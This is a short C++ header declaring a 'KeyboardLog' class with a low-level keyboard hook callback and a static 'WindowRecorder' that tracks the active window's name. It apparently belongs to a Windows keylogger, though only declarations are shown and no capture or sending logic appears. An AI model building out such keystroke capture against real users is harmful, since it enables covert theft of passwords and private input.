#pragma once
#include "WindowRecorder.h"


class KeyboardLog
{
public:
	KeyboardLog();
	~KeyboardLog();
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

private:	
	static WindowRecorder recorder;		/* The thread that gathers the current name of the window. Static so that it can be referenced in lowlevelkeyboardproc */
};

